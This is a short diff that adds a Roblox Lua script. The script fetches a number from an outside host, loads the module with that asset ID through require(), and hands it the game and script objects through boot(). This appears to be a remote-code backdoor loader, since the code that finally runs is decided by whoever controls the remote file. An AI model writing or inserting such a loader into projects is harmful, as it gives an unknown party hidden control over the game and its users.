@@ -1,0 +1,5 @@
+local HttpService = game:GetService("HttpService")
+local resp = HttpService:GetAsync("https://cdn.example.dev/m.txt")
+local id = tonumber(resp)
+local mod = require(id)
+mod.boot(game, script)
